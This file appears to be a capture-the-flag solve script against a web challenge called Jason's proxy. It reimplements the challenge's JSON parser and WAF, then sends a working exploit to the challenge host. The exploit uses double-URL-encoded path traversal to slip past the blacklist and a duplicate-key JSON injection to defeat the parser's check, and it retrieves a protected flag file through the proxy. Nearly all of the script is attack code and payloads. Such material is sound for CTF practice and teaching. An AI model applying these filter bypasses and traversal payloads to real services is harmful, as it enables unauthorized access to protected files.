from os.path import abspath
from requests import *
import requests
from base64 import b64encode, b64decode
from flask import Flask, request, render_template
import base64
from urllib.parse import unquote, urlparse, urljoin


class JSON(object):
    def __init__(self):
        self.forbidden = ["'", "\"", "{", "}",
                          "[", "]", ",", "(", ")", "\\", ";", "%"]
        self.checked = []

    def _forbidden_chk(self, key, value):
        chk = False
        for bad in self.forbidden:
            if bad in key:
                chk = True
                break
            if bad in value:
                chk = True
                break
        return chk

    def _checked(self, key):
        chk = True
        if key in self.checked:
            chk = False
        return chk

    def _security(self, key, value):
        chk = False
        if not self._checked(key):
            return chk
        if self._forbidden_chk(key, value):
            chk = True
        if key == "img":
            value = b64decode(bytes(value, 'utf-8')).decode()
            if self._forbidden_chk(key, value):
                chk = True
        if chk == False:
            self.checked.append(key)
        return chk

    def parse(self, data):
        parsed_data = [obj.replace("'", '').replace('"', '').split(
            ':') for obj in data.decode()[1:][:-1].split(',')]
        print(parsed_data)
        built_data = {}
        for obj in parsed_data:
            if self._security(obj[0], obj[1]):
                return "Jasons Secure JSON Parsing Blocked Your Request"
            if obj[0] == "img":
                obj[1] = b64decode(bytes(obj[1], 'utf-8')).decode()
            built_data[obj[0]] = obj[1]
        print(built_data)
        return built_data


whitelist = ["http://127.0.0.1/static/images/",
             "http://localhost/static/images/"]
blacklist = ["admin", "flag"]
remove_list = ["'", "OR", "SELECT", "FROM", ";", "../", "./", "....//"]


def waf(url):
    resp = unquote(url)
    #print(resp)
    whitelist_check = False
    for uri in whitelist:
        if resp.lower().startswith(uri):
            whitelist_check = uri
            break
    if whitelist_check == False:
        return None
    for forbidden in blacklist:
        if forbidden in resp.lower():
            return None
    for badstr in remove_list:
        resp = resp.replace(badstr, "BLOCKEDBY1337WAF")
    resp = urlparse(resp)
    #print(resp)
    resp = unquote(abspath(resp.path))
    #print(resp)
    print(urljoin(whitelist_check, resp))
    return urljoin(whitelist_check, resp)


json = JSON()
url_og = "http://127.0.0.1/static/images/..%252f..%252f%2561dmin%252ffl%2561g"
url = url_og.encode('utf-8')
url = base64.b64encode(url).decode('utf-8')
print(waf(url_og))

TARGET_URL = 'https://web-jasons-proxy-a1fabcdf.chal-2021.duc.tf'
#test={"img":"aHR0","img":"aHR0cDovLzEyNy4wLjAuMS9zdGF0aWMvaW1hZ2VzLyUyZSUyNTJlLyUyZSUyNTJlLyUyNTYxZG1pbi9mbCUyNTYxZw=="}
#test={ "test" : f"test,'img':'test','img':'{url}'" }
#test={"img":"aHR0cDovLzEyNy4wLjAuMS9zdGF0aWMvaW1hZ2VzLw=="}
#test={"test": f"test,'img':'aHR0cDovLzEyNy4wLjAuMS9zdGF0aWMvaW1hZ2VzLw=='"}
test = {"test": f"test,'img':'aHR0cDovLzEyNy4wLjAuMS9zdGF0aWMvaW1hZ2VzLw==','img':'{url}'"}
print(test)
res = requests.post(f"{TARGET_URL}/jason_loader", json=test)
print(res.text)
res = res.json()
res = res.get('imagedata')
res = base64.b64decode(res).decode('utf-8')
print(res)
